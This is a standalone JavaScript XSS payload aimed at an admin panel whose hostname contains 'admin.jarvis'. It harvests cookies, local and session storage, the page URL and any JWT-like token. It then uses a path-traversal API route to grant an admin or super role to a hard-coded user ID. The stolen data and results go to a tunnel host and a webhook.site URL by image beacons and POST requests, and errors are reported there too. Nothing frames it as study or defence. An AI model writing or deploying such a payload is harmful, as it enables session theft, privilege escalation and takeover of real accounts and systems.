(async()=>{
try{
if(!window.location.hostname.includes('admin.jarvis')){return;}
const steal={};
try{steal.cookie=(document.cookie||'').substring(0,800);}catch(e){steal.cookie='';}
try{
  const ls={}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i); ls[k]=(localStorage.getItem(k)||'').substring(0,200);}
  steal.ls=JSON.stringify(ls).substring(0,900);
}catch(e){steal.ls='';}
try{
  const ss={}; for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i); ss[k]=(sessionStorage.getItem(k)||'').substring(0,200);}
  steal.ss=JSON.stringify(ss).substring(0,900);
}catch(e){steal.ss='';}
try{steal.href=location.href.substring(0,200);}catch(e){}
let jwt='';
try{
  for(const store of [localStorage,sessionStorage]){
    for(let i=0;i<store.length;i++){
      const v=store.getItem(store.key(i))||'';
      if(v.startsWith('eyJ')&&v.length>100){jwt=v.substring(0,200);break;}
    }
    if(jwt) break;
  }
}catch(ex){}
const r1=await fetch('/api/session/login/../../v1/admin/roles',{credentials:'include',headers:{'Accept':'application/json'}});
const d1=await r1.json().catch(()=>({}));
const roles=Array.isArray(d1.data)?d1.data:[];
const uid='01967db5-ae00-4642-96ba-f82321e15ef0';
let assignStatus=0,roleId='';
if(roles.length>0){
  const adminRole=roles.find(r=>r.name&&(r.name.toLowerCase().includes('admin')||r.name.toLowerCase().includes('super')))||roles[0];
  roleId=(adminRole.id||'').substring(0,8);
  const r2=await fetch('/api/session/login/../../v1/admin/users/'+uid+'/roles',{
    method:'POST',credentials:'include',
    headers:{'Content-Type':'application/json','Accept':'application/json'},
    body:JSON.stringify({roleId:adminRole.id})
  });
  assignStatus=r2.status;
}
const params=new URLSearchParams({
  s:String(assignStatus),
  r:roleId,
  j:jwt?'YES':'NO',
  jv:(jwt||'').substring(0,80),
  ck:(steal.cookie||'').substring(0,300),
  ls:(steal.ls||'').substring(0,300),
  ss:(steal.ss||'').substring(0,200),
  h:(steal.href||'')
});
const beacons=['https://59c3825f19d3f1.lhr.life','https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14'];
for(const b of beacons){
  try{new Image().src=b+(b.includes('webhook.site')?'?':'/xss?')+params.toString();}catch(x){}
  try{fetch(b+(b.includes('webhook.site')?'?':'/xss?')+params.toString(),{mode:'no-cors'});}catch(x){}
}
try{
  await fetch('https://59c3825f19d3f1.lhr.life/dump',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain'},body:JSON.stringify({cookie:steal.cookie,ls:steal.ls,ss:steal.ss,href:steal.href,jwt:jwt,assign:assignStatus,roleId:roleId,t:Date.now()})});
}catch(x){}
}catch(e){
  const msg=encodeURIComponent(String(e).substring(0,120));
  try{new Image().src='https://59c3825f19d3f1.lhr.life/err?e='+msg;}catch(x){}
  try{new Image().src='https://webhook.site/9d79d0d2-9a16-407f-95e4-5db33e069f14?err='+msg;}catch(x){}
}
})();
